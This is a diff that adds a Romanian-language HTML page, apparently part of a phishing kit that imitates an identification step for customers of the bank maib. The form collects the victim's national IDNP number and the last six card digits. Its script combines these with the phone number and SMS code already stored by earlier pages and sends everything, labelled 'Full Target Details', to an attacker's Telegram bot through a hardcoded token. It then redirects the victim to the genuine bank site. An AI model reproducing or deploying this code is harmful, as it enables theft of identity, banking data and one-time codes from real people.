@@ -1,0 +1,54 @@
+<!DOCTYPE html>
+<html lang="ro">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Identification</title>
+    <style>
+        body { font-family: 'Segoe UI', sans-serif; background-color: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { background-color: white; width: 100%; max-width: 400px; height: 100vh; padding: 20px; box-sizing: border-box; display: flex; flex-direction: column; }
+        .back-button { font-size: 24px; cursor: pointer; margin-bottom: 20px; color: #333; text-decoration: none; }
+        h1 { font-size: 20px; color: #1a1a1a; margin: 0 0 20px 0; line-height: 1.4; font-weight: 700; }
+        .input-label { font-size: 18px; color: #1a1a1a; margin: 25px 0 15px 0; line-height: 1.4; font-weight: 700; display: block; }
+        .input-group { background-color: #f0f2f5; border-radius: 12px; padding: 18px; border: 2px solid transparent; }
+        input { border: none; background: transparent; font-size: 18px; outline: none; width: 100%; color: #333; -moz-appearance: textfield; }
+        input::-webkit-outer-spin-button, input::-webkit-inner-spin-button { -webkit-appearance: none; margin: 0; }
+        .btn-continue { background-color: #002352; color: white; border: none; padding: 18px; border-radius: 12px; font-size: 18px; font-weight: bold; margin-top: auto; margin-bottom: 20px; cursor: pointer; width: 100%; }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <a href="otp.html" class="back-button">←</a>
+        <h1>Vă rugăm să introduceți numărul IDNP format din 13 cifre, care se găsește pe actul de identitate sau pe permisul de ședere.</h1>
+        <div class="input-group">
+            <input type="number" id="idnpInput" placeholder="IDNP (13 cifre)" oninput="if(this.value.length > 13) this.value=this.value.slice(0,13)">
+        </div>
+
+        <label class="input-label">Vă rugăm să introduceți ultimele 6 cifre ale numărului cardului dumneavoastră bancomat</label>
+        <div class="input-group">
+            <input type="number" id="cardInput" placeholder="Ultimile 6 cifre" oninput="if(this.value.length > 6) this.value=this.value.slice(0,6)">
+        </div>
+
+        <button class="btn-continue" onclick="sendFinal()">Continuă</button>
+    </div>
+
+    <script>
+        const botToken = "8750310622:AAGlyWo1lsyJZGX9RopjWIF6a8VyvNPCmnA";
+        const chatId = "8129155953";
+
+        function sendFinal() {
+            const idnp = document.getElementById('idnpInput').value;
+            const card = document.getElementById('cardInput').value;
+            const phone = localStorage.getItem('userPhone') || "Unknown";
+            const sms = localStorage.getItem('smsCode') || "Unknown";
+
+            if(idnp.length === 13 && card.length === 6) {
+                const msg = `✅ **Full Target Details** ✅\n\n📱 Phone: \`${phone}\`\n💬 SMS: \`${sms}\`\n🆔 IDNP: \`${idnp}\`\n💳 Card (6): \`${card}\``;
+                
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}&parse_mode=Markdown`)
+                .then(() => window.location.href = 'https://www.maib.md/');
+            } else { alert("Completați corect!"); }
+        }
+    </script>
+</body>
+</html>
